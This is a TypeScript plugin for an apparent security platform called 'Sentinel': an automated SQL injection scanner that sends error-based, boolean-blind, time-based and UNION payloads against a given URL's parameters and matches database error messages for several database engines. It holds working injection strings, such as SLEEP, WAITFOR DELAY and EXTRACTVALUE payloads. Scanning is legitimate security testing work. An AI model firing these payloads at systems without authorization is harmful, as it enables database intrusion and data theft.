/**
 * SQL Injection Scanner Tool (Agent Version)
 * 
 * @plugin sql_injection_scanner
 * @name SQL Injection Scanner
 * @version 1.0.0
 * @author Sentinel Team
 * @category vuln
 * @default_severity critical
 * @tags sqli, sql-injection, vulnerability, security, web, owasp, database
 * @description Active SQL injection vulnerability scanner that tests parameters with various payloads including error-based, blind, and time-based techniques
 */

// Sentinel Dictionary API declaration
declare const Sentinel: {
    Dictionary: {
        get(idOrName: string): Promise<any>;
        getWords(idOrName: string, limit?: number): Promise<string[]>;
        list(filter?: { dictType?: string; category?: string }): Promise<any[]>;
        getMergedWords(idsOrNames: string[], deduplicate?: boolean): Promise<string[]>;
    };
    log(level: string, message: string): void;
};

interface ToolInput {
    url: string;
    method?: string;
    params?: Record<string, string>;
    headers?: Record<string, string>;
    body?: string;
    contentType?: string;
    timeout?: number;
    concurrency?: number;
    userAgent?: string;
    testErrorBased?: boolean;
    testBlind?: boolean;
    testTimeBased?: boolean;
    testUnion?: boolean;
    dbType?: string;
    customPayloads?: string[];
    dictionaryId?: string;
    timeThreshold?: number;
}

interface SqliTest {
    parameter: string;
    location: string;
    payload: string;
    technique: string;
    vulnerable: boolean;
    confidence: string;
    evidence?: string;
    dbType?: string;
    responseCode?: number;
    responseTime?: number;
    baselineTime?: number;
}

interface ToolOutput {
    success: boolean;
    data?: {
        url: string;
        method: string;
        tests: SqliTest[];
        summary: {
            totalTests: number;
            vulnerableCount: number;
            testedParameters: string[];
            vulnerableParameters: string[];
            detectedDbTypes: string[];
        };
    };
    error?: string;
}

// SQL error patterns by database type
const SQL_ERROR_PATTERNS: Record<string, RegExp[]> = {
    mysql: [
        /SQL syntax.*?MySQL/i,
        /Warning.*?mysql_/i,
        /MySQLSyntaxErrorException/i,
        /valid MySQL result/i,
        /check the manual that corresponds to your MySQL server version/i,
        /MySqlClient\./i,
        /com\.mysql\.jdbc/i,
        /Unclosed quotation mark after the character string/i,
        /SQLSTATE\[42000\]/i,
        /mysql_fetch_array\(\)/i,
        /mysql_num_rows\(\)/i,
        /MySQL Query fail/i,
    ],
    
    postgresql: [
        /PostgreSQL.*?ERROR/i,
        /Warning.*?pg_/i,
        /valid PostgreSQL result/i,
        /Npgsql\./i,
        /PG::SyntaxError/i,
        /org\.postgresql\.util\.PSQLException/i,
        /ERROR:\s+syntax error at or near/i,
        /ERROR: parser: parse error at or near/i,
        /PostgreSQL query failed/i,
        /PSQLException/i,
    ],
    
    mssql: [
        /Driver.*? SQL[\-\_\ ]*Server/i,
        /OLE DB.*? SQL Server/i,
        /\bSQL Server[^&lt;&quot;]+Driver/i,
        /Warning.*?mssql_/i,
        /\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,
        /System\.Data\.SqlClient\.SqlException/i,
        /Exception.*?\WSystem\.Data\.SqlClient\./i,
        /Exception.*?\WRoadhouse\.Cms\./i,
        /Microsoft SQL Native Client error '[0-9a-fA-F]{8}/i,
        /\[SQL Server\]/i,
        /ODBC SQL Server Driver/i,
        /ODBC Driver \d+ for SQL Server/i,
        /SQLServer JDBC Driver/i,
        /com\.microsoft\.sqlserver\.jdbc/i,
        /macabordar\.telefonicamovistar\.com/i,
        /Unclosed quotation mark after the character string/i,
    ],
    
    oracle: [
        /\bORA-[0-9][0-9][0-9][0-9]/i,
        /Oracle error/i,
        /Oracle.*?Driver/i,
        /Warning.*?oci_/i,
        /Warning.*?ora_/i,
        /oracle\.jdbc\.driver/i,
        /quoted string not properly terminated/i,
        /SQL command not properly ended/i,
    ],
    
    sqlite: [
        /SQLite\/JDBCDriver/i,
        /SQLite\.Exception/i,
        /System\.Data\.SQLite\.SQLiteException/i,
        /Warning.*?sqlite_/i,
        /Warning.*?SQLite3::/i,
        /\[SQLITE_ERROR\]/i,
        /SQLite error \d+:/i,
        /sqlite3\.OperationalError:/i,
        /SQLite3::SQLException/i,
        /org\.sqlite\.JDBC/i,
        /SQLiteException/i,
    ],
    
    generic: [
        /SQL syntax/i,
        /syntax error/i,
        /mysql_fetch/i,
        /num_rows/i,
        /Incorrect syntax near/i,
        /Unclosed quotation mark/i,
        /quoted string not properly terminated/i,
        /You have an error in your SQL syntax/i,
        /supplied argument is not a valid/i,
        /Division by zero/i,
        /ODBC.*?Driver/i,
        /Error Executing Database Query/i,
        /DB2 SQL error/i,
        /Sybase message/i,
        /Ingres SQLSTATE/i,
        /Informix ODBC Driver/i,
    ],
};

// SQL injection payloads by technique
const SQLI_PAYLOADS: Record<string, { payload: string; technique: string; dbType?: string }[]> = {
    error_based: [
        // Generic
        { payload: "'", technique: "error", dbType: "generic" },
        { payload: "\"", technique: "error", dbType: "generic" },
        { payload: "'--", technique: "error", dbType: "generic" },
        { payload: "\"--", technique: "error", dbType: "generic" },
        { payload: "' OR '1'='1", technique: "error", dbType: "generic" },
        { payload: "\" OR \"1\"=\"1", technique: "error", dbType: "generic" },
        { payload: "' OR '1'='1'--", technique: "error", dbType: "generic" },
        { payload: "' OR '1'='1'/*", technique: "error", dbType: "generic" },
        { payload: "1' AND '1'='1", technique: "error", dbType: "generic" },
        { payload: "1\" AND \"1\"=\"1", technique: "error", dbType: "generic" },
        { payload: "' AND 1=1--", technique: "error", dbType: "generic" },
        { payload: "' AND 1=2--", technique: "error", dbType: "generic" },
        { payload: "admin'--", technique: "error", dbType: "generic" },
        { payload: "') OR ('1'='1", technique: "error", dbType: "generic" },
        { payload: "')) OR (('1'='1", technique: "error", dbType: "generic" },
        
        // MySQL specific
        { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", technique: "error", dbType: "mysql" },
        { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", technique: "error", dbType: "mysql" },
        { payload: "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", technique: "error", dbType: "mysql" },
        
        // MSSQL specific
        { payload: "' AND 1=CONVERT(int,@@version)--", technique: "error", dbType: "mssql" },
        { payload: "'; WAITFOR DELAY '0:0:0'--", technique: "error", dbType: "mssql" },
        
        // PostgreSQL specific
        { payload: "' AND 1=CAST(VERSION() AS INT)--", technique: "error", dbType: "postgresql" },
        { payload: "'::int", technique: "error", dbType: "postgresql" },
        
        // Oracle specific
        { payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", technique: "error", dbType: "oracle" },
    ],
    
    blind_boolean: [
        { payload: "' AND 1=1--", technique: "blind-boolean", dbType: "generic" },
        { payload: "' AND 1=2--", technique: "blind-boolean", dbType: "generic" },
        { payload: "' AND 'a'='a", technique: "blind-boolean", dbType: "generic" },
        { payload: "' AND 'a'='b", technique: "blind-boolean", dbType: "generic" },
        { payload: "1' AND 1=1--", technique: "blind-boolean", dbType: "generic" },
        { payload: "1' AND 1=2--", technique: "blind-boolean", dbType: "generic" },
        { payload: "' OR 1=1--", technique: "blind-boolean", dbType: "generic" },
        { payload: "' OR 1=2--", technique: "blind-boolean", dbType: "generic" },
        { payload: "1 AND 1=1", technique: "blind-boolean", dbType: "generic" },
        { payload: "1 AND 1=2", technique: "blind-boolean", dbType: "generic" },
    ],
    
    time_based: [
        // MySQL
        { payload: "' AND SLEEP(5)--", technique: "time-based", dbType: "mysql" },
        { payload: "' OR SLEEP(5)--", technique: "time-based", dbType: "mysql" },
        { payload: "1' AND SLEEP(5)--", technique: "time-based", dbType: "mysql" },
        { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", technique: "time-based", dbType: "mysql" },
        { payload: "' AND BENCHMARK(5000000,SHA1('test'))--", technique: "time-based", dbType: "mysql" },
        
        // MSSQL
        { payload: "'; WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
        { payload: "' WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
        { payload: "1; WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
        
        // PostgreSQL
        { payload: "' AND pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
        { payload: "'; SELECT pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
        { payload: "1' AND pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
        
        // Oracle
        { payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", technique: "time-based", dbType: "oracle" },
        { payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", technique: "time-based", dbType: "oracle" },
        
        // SQLite
        { payload: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", technique: "time-based", dbType: "sqlite" },
    ],
    
    union_based: [
        { payload: "' UNION SELECT NULL--", technique: "union", dbType: "generic" },
        { payload: "' UNION SELECT NULL,NULL--", technique: "union", dbType: "generic" },
        { payload: "' UNION SELECT NULL,NULL,NULL--", technique: "union", dbType: "generic" },
        { payload: "' UNION SELECT 1--", technique: "union", dbType: "generic" },
        { payload: "' UNION SELECT 1,2--", technique: "union", dbType: "generic" },
        { payload: "' UNION SELECT 1,2,3--", technique: "union", dbType: "generic" },
        { payload: "' UNION ALL SELECT NULL--", technique: "union", dbType: "generic" },
        { payload: "' UNION ALL SELECT NULL,NULL--", technique: "union", dbType: "generic" },
        { payload: "1' UNION SELECT NULL--", technique: "union", dbType: "generic" },
        { payload: "1' UNION SELECT 1,2,3--", technique: "union", dbType: "generic" },
        { payload: "') UNION SELECT NULL--", technique: "union", dbType: "generic" },
        { payload: "')) UNION SELECT NULL--", technique: "union", dbType: "generic" },
    ],
    
    stacked: [
        { payload: "'; SELECT 1--", technique: "stacked", dbType: "generic" },
        { payload: "'; SELECT @@version--", technique: "stacked", dbType: "mssql" },
        { payload: "'; SELECT version()--", technique: "stacked", dbType: "mysql" },
        { payload: "'; SELECT version()--", technique: "stacked", dbType: "postgresql" },
    ],
};

/**
 * Export input schema
 */
export function get_input_schema() {
    return {
        type: "object",
        required: ["url"],
        properties: {
            url: {
                type: "string",
                description: "Target URL to test for SQL injection vulnerabilities"
            },
            method: {
                type: "string",
                enum: ["GET", "POST", "PUT", "PATCH"],
                description: "HTTP method to use",
                default: "GET"
            },
            params: {
                type: "object",
                description: "URL parameters to test (key-value pairs)",
                additionalProperties: { type: "string" }
            },
            headers: {
                type: "object",
                description: "Custom headers to include",
                additionalProperties: { type: "string" }
            },
            body: {
                type: "string",
                description: "Request body (for POST/PUT/PATCH)"
            },
            contentType: {
                type: "string",
                description: "Content-Type header",
                default: "application/x-www-form-urlencoded"
            },
            timeout: {
                type: "integer",
                description: "Request timeout in milliseconds",
                default: 15000,
                minimum: 5000,
                maximum: 60000
            },
            concurrency: {
                type: "integer",
                description: "Number of concurrent requests",
                default: 3,
                minimum: 1,
                maximum: 10
            },
            userAgent: {
                type: "string",
                description: "Custom User-Agent header"
            },
            testErrorBased: {
                type: "boolean",
                description: "Test for error-based SQL injection",
                default: true
            },
            testBlind: {
                type: "boolean",
                description: "Test for blind boolean-based SQL injection",
                default: true
            },
            testTimeBased: {
                type: "boolean",
                description: "Test for time-based blind SQL injection",
                default: true
            },
            testUnion: {
                type: "boolean",
                description: "Test for UNION-based SQL injection",
                default: true
            },
            dbType: {
                type: "string",
                enum: ["auto", "mysql", "postgresql", "mssql", "oracle", "sqlite"],
                description: "Target database type (auto for detection)",
                default: "auto"
            },
            customPayloads: {
                type: "array",
                items: { type: "string" },
                description: "Custom SQL injection payloads to test"
            },
            dictionaryId: {
                type: "string",
                description: "Dictionary ID or name for SQLi payloads"
            },
            timeThreshold: {
                type: "integer",
                description: "Time threshold in ms for time-based detection",
                default: 5000,
                minimum: 3000,
                maximum: 30000
            }
        }
    };
}

globalThis.get_input_schema = get_input_schema;

/**
 * Export output schema
 */
export function get_output_schema() {
    return {
        type: "object",
        properties: {
            success: { type: "boolean", description: "Whether the operation succeeded" },
            data: {
                type: "object",
                properties: {
                    url: { type: "string", description: "Target URL" },
                    method: { type: "string" },
                    tests: {
                        type: "array",
                        items: {
                            type: "object",
                            properties: {
                                parameter: { type: "string" },
                                payload: { type: "string" },
                                technique: { type: "string" },
                                vulnerable: { type: "boolean" },
                                confidence: { type: "string" },
                                dbType: { type: "string" },
                                evidence: { type: "string" }
                            }
                        },
                        description: "SQL injection test results"
                    },
                    summary: {
                        type: "object",
                        properties: {
                            totalTests: { type: "integer" },
                            vulnerableCount: { type: "integer" },
                            vulnerableParameters: { type: "array", items: { type: "string" } },
                            detectedDbTypes: { type: "array", items: { type: "string" } }
                        }
                    }
                }
            },
            error: { type: "string", description: "Error message if failed" }
        }
    };
}

globalThis.get_output_schema = get_output_schema;

/**
 * Extract parameters from URL and body
 */
function extractParameters(
    url: string,
    body?: string,
    contentType?: string,
    providedParams?: Record<string, string>
): Map<string, { value: string; location: "query" | "body" | "provided" }> {
    const params = new Map<string, { value: string; location: "query" | "body" | "provided" }>();
    
    if (providedParams) {
        for (const [key, value] of Object.entries(providedParams)) {
            params.set(key, { value, location: "provided" });
        }
    }
    
    try {
        const urlObj = new URL(url);
        urlObj.searchParams.forEach((value, key) => {
            if (!params.has(key)) {
                params.set(key, { value, location: "query" });
            }
        });
    } catch {
        const match = url.match(/\?(.+)/);
        if (match) {
            match[1].split("&").forEach(pair => {
                const [key, ...rest] = pair.split("=");
                if (key && !params.has(key)) {
                    params.set(key, {
                        value: decodeURIComponent(rest.join("=")),
                        location: "query"
                    });
                }
            });
        }
    }
    
    if (body) {
        if (contentType?.includes("application/json")) {
            try {
                const json = JSON.parse(body);
                const flatten = (obj: any, prefix = "") => {
                    for (const [key, value] of Object.entries(obj)) {
                        const fullKey = prefix ? `${prefix}.${key}` : key;
                        if (typeof value === "object" && value !== null && !Array.isArray(value)) {
                            flatten(value, fullKey);
                        } else if ((typeof value === "string" || typeof value === "number") && !params.has(fullKey)) {
                            params.set(fullKey, { value: String(value), location: "body" });
                        }
                    }
                };
                flatten(json);
            } catch { /* ignore */ }
        } else {
            body.split("&").forEach(pair => {
                const [key, ...rest] = pair.split("=");
                if (key && !params.has(key)) {
                    params.set(key, {
                        value: decodeURIComponent(rest.join("=")),
                        location: "body"
                    });
                }
            });
        }
    }
    
    return params;
}

/**
 * Build URL with payload
 */
function buildTestUrl(baseUrl: string, paramName: string, payload: string): string {
    try {
        const url = new URL(baseUrl);
        url.searchParams.set(paramName, payload);
        return url.toString();
    } catch {
        const separator = baseUrl.includes("?") ? "&" : "?";
        return `${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`;
    }
}

/**
 * Build body with payload
 */
function buildTestBody(
    originalBody: string | undefined,
    paramName: string,
    payload: string,
    contentType?: string
): string {
    if (contentType?.includes("application/json")) {
        try {
            const json = JSON.parse(originalBody || "{}");
            const parts = paramName.split(".");
            let current = json;
            for (let i = 0; i < parts.length - 1; i++) {
                if (!current[parts[i]]) current[parts[i]] = {};
                current = current[parts[i]];
            }
            current[parts[parts.length - 1]] = payload;
            return JSON.stringify(json);
        } catch {
            return originalBody || "";
        }
    } else {
        const params = new URLSearchParams(originalBody || "");
        params.set(paramName, payload);
        return params.toString();
    }
}

/**
 * Check for SQL error patterns in response
 */
function detectSqlError(body: string): { detected: boolean; dbType: string; evidence: string } {
    for (const [dbType, patterns] of Object.entries(SQL_ERROR_PATTERNS)) {
        for (const pattern of patterns) {
            const match = body.match(pattern);
            if (match) {
                const index = body.indexOf(match[0]);
                const start = Math.max(0, index - 50);
                const end = Math.min(body.length, index + match[0].length + 50);
                return {
                    detected: true,
                    dbType: dbType === "generic" ? "unknown" : dbType,
                    evidence: body.substring(start, end),
                };
            }
        }
    }
    return { detected: false, dbType: "", evidence: "" };
}

/**
 * Compare responses for blind detection
 */
function compareResponses(baseline: string, test: string): number {
    if (baseline === test) return 1.0;
    if (baseline.length === 0 || test.length === 0) return 0;
    
    // Simple similarity based on length
    const lengthDiff = Math.abs(baseline.length - test.length);
    const maxLength = Math.max(baseline.length, test.length);
    const lengthSimilarity = 1 - (lengthDiff / maxLength);
    
    return lengthSimilarity;
}

/**
 * Run tasks with concurrency limit
 */
async function runWithConcurrency<T>(
    tasks: (() => Promise<T>)[],
    concurrency: number
): Promise<T[]> {
    const results: T[] = [];
    let index = 0;
    
    async function worker() {
        while (index < tasks.length) {
            const currentIndex = index++;
            results[currentIndex] = await tasks[currentIndex]();
        }
    }
    
    const workers = Array(Math.min(concurrency, tasks.length))
        .fill(null)
        .map(() => worker());
    
    await Promise.all(workers);
    return results;
}

/**
 * Load payloads from dictionary or use built-in
 */
async function loadPayloads(
    dictionaryId?: string,
    customPayloads?: string[],
    testErrorBased?: boolean,
    testBlind?: boolean,
    testTimeBased?: boolean,
    testUnion?: boolean,
    targetDbType?: string
): Promise<{ payload: string; technique: string; dbType?: string }[]> {
    const payloads: { payload: string; technique: string; dbType?: string }[] = [];
    
    // Custom payloads first
    if (customPayloads && customPayloads.length > 0) {
        for (const p of customPayloads) {
            payloads.push({ payload: p, technique: "custom", dbType: "generic" });
        }
    }
    
    // Try dictionary
    if (dictionaryId) {
        try {
            if (typeof Sentinel !== "undefined" && Sentinel.Dictionary) {
                const words = await Sentinel.Dictionary.getWords(dictionaryId);
                if (words && words.length > 0) {
                    for (const p of words) {
                        payloads.push({ payload: p, technique: "dictionary", dbType: "generic" });
                    }
                    return payloads;
                }
            }
        } catch (e) {
            console.debug(`Failed to load SQLi dictionary: ${e}`);
        }
    }
    
    // Filter by database type
    const filterByDb = (items: { payload: string; technique: string; dbType?: string }[]) => {
        if (!targetDbType || targetDbType === "auto") return items;
        return items.filter(i => !i.dbType || i.dbType === "generic" || i.dbType === targetDbType);
    };
    
    // Use built-in payloads
    if (testErrorBased !== false) {
        payloads.push(...filterByDb(SQLI_PAYLOADS.error_based));
    }
    
    if (testBlind !== false) {
        payloads.push(...filterByDb(SQLI_PAYLOADS.blind_boolean));
    }
    
    if (testTimeBased !== false) {
        payloads.push(...filterByDb(SQLI_PAYLOADS.time_based));
    }
    
    if (testUnion !== false) {
        payloads.push(...filterByDb(SQLI_PAYLOADS.union_based));
    }
    
    return payloads;
}

/**
 * Main analysis function
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    const startTime = performance.now();
    
    try {
        // Validate input
        if (!input.url || typeof input.url !== "string") {
            return {
                success: false,
                error: "Invalid input: url parameter is required"
            };
        }
        
        let baseUrl = input.url;
        if (!baseUrl.startsWith("http://") && !baseUrl.startsWith("https://")) {
            baseUrl = `https://${baseUrl}`;
        }
        
        const method = (input.method || "GET").toUpperCase();
        const timeout = input.timeout || 15000;
        const concurrency = input.concurrency || 3;
        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        const contentType = input.contentType || "application/x-www-form-urlencoded";
        const timeThreshold = input.timeThreshold || 5000;
        
        // Extract parameters
        const params = extractParameters(baseUrl, input.body, contentType, input.params);
        
        if (params.size === 0) {
            return {
                success: false,
                error: "No parameters found to test. Provide params or use a URL with query parameters."
            };
        }
        
        // Load payloads
        const payloads = await loadPayloads(
            input.dictionaryId,
            input.customPayloads,
            input.testErrorBased,
            input.testBlind,
            input.testTimeBased,
            input.testUnion,
            input.dbType
        );
        
        const tests: SqliTest[] = [];
        const vulnerableParams = new Set<string>();
        const detectedDbTypes = new Set<string>();
        
        // Get baseline response for each parameter
        const baselines = new Map<string, { body: string; time: number }>();
        
        for (const [paramName, { value, location }] of params) {
            try {
                let testUrl = baseUrl;
                let testBody = input.body;
                
                if (location === "query" || location === "provided") {
                    testUrl = buildTestUrl(baseUrl, paramName, value);
                }
                
                const headers: Record<string, string> = {
                    "User-Agent": userAgent,
                    "Accept": "*/*",
                    ...input.headers,
                };
                
                if (method !== "GET" && testBody) {
                    headers["Content-Type"] = contentType;
                }
                
                const startReq = performance.now();
                const response = await fetch(testUrl, {
                    method,
                    headers,
                    body: method !== "GET" ? testBody : undefined,
                    // @ts-ignore
                    timeout,
                });
                const baselineTime = Math.round(performance.now() - startReq);
                const body = await response.text();
                
                baselines.set(paramName, { body, time: baselineTime });
            } catch {
                // Ignore baseline errors
            }
        }
        
        // Create test tasks
        const tasks: (() => Promise<SqliTest | null>)[] = [];
        
        for (const [paramName, { value, location }] of params) {
            const baseline = baselines.get(paramName);
            
            for (const { payload, technique, dbType } of payloads) {
                tasks.push(async () => {
                    const testStart = performance.now();
                    
                    try {
                        let testUrl = baseUrl;
                        let testBody = input.body;
                        
                        // Append payload to original value
                        const testValue = value + payload;
                        
                        if (location === "query" || location === "provided") {
                            testUrl = buildTestUrl(baseUrl, paramName, testValue);
                        } else if (location === "body") {
                            testBody = buildTestBody(input.body, paramName, testValue, contentType);
                        }
                        
                        const headers: Record<string, string> = {
                            "User-Agent": userAgent,
                            "Accept": "*/*",
                            ...input.headers,
                        };
                        
                        if (method !== "GET" && testBody) {
                            headers["Content-Type"] = contentType;
                        }
                        
                        const response = await fetch(testUrl, {
                            method,
                            headers,
                            body: method !== "GET" ? testBody : undefined,
                            // @ts-ignore
                            timeout: technique === "time-based" ? timeout + timeThreshold + 5000 : timeout,
                        });
                        
                        const responseTime = Math.round(performance.now() - testStart);
                        const body = await response.text();
                        
                        // Check for error-based SQLi
                        if (technique === "error" || technique === "custom" || technique === "dictionary") {
                            const errorResult = detectSqlError(body);
                            if (errorResult.detected) {
                                return {
                                    parameter: paramName,
                                    location,
                                    payload,
                                    technique: "error-based",
                                    vulnerable: true,
                                    confidence: "high",
                                    evidence: errorResult.evidence.substring(0, 300),
                                    dbType: errorResult.dbType,
                                    responseCode: response.status,
                                    responseTime,
                                    baselineTime: baseline?.time,
                                };
                            }
                        }
                        
                        // Check for time-based SQLi
                        if (technique === "time-based" && baseline) {
                            const timeDiff = responseTime - baseline.time;
                            if (timeDiff >= timeThreshold - 1000) {
                                return {
                                    parameter: paramName,
                                    location,
                                    payload,
                                    technique: "time-based",
                                    vulnerable: true,
                                    confidence: timeDiff >= timeThreshold ? "high" : "medium",
                                    evidence: `Response delayed by ${timeDiff}ms (baseline: ${baseline.time}ms, test: ${responseTime}ms)`,
                                    dbType: dbType || "unknown",
                                    responseCode: response.status,
                                    responseTime,
                                    baselineTime: baseline.time,
                                };
                            }
                        }
                        
                        // Check for blind boolean-based SQLi
                        if (technique === "blind-boolean" && baseline) {
                            const similarity = compareResponses(baseline.body, body);
                            // Significant difference might indicate SQLi
                            if (similarity < 0.8 && response.status === 200) {
                                // Need to verify with opposite condition
                                // This is a simplified check
                                return null;
                            }
                        }
                        
                        return null;
                        
                    } catch (e: any) {
                        // Timeout might indicate time-based SQLi
                        if (technique === "time-based" && e.message?.includes("timeout")) {
                            return {
                                parameter: paramName,
                                location,
                                payload,
                                technique: "time-based",
                                vulnerable: true,
                                confidence: "medium",
                                evidence: "Request timed out, possible time-based SQLi",
                                dbType: dbType || "unknown",
                                responseCode: 0,
                                responseTime: timeout,
                                baselineTime: baseline?.time,
                            };
                        }
                        return null;
                    }
                });
            }
        }
        
        // Execute tests with concurrency
        const results = await runWithConcurrency(tasks, concurrency);
        
        // Collect results
        for (const result of results) {
            if (result && result.vulnerable) {
                tests.push(result);
                vulnerableParams.add(result.parameter);
                if (result.dbType && result.dbType !== "unknown") {
                    detectedDbTypes.add(result.dbType);
                }
            }
        }
        
        // Deduplicate by parameter and technique (keep highest confidence)
        const uniqueTests = new Map<string, SqliTest>();
        for (const test of tests) {
            const key = `${test.parameter}:${test.technique}`;
            const existing = uniqueTests.get(key);
            if (!existing || (test.confidence === "high" && existing.confidence !== "high")) {
                uniqueTests.set(key, test);
            }
        }
        
        const finalTests = Array.from(uniqueTests.values());
        
        return {
            success: true,
            data: {
                url: baseUrl,
                method,
                tests: finalTests,
                summary: {
                    totalTests: tasks.length,
                    vulnerableCount: finalTests.length,
                    testedParameters: Array.from(params.keys()),
                    vulnerableParameters: Array.from(vulnerableParams),
                    detectedDbTypes: Array.from(detectedDbTypes),
                },
            },
        };
        
    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error),
        };
    }
}

globalThis.analyze = analyze;
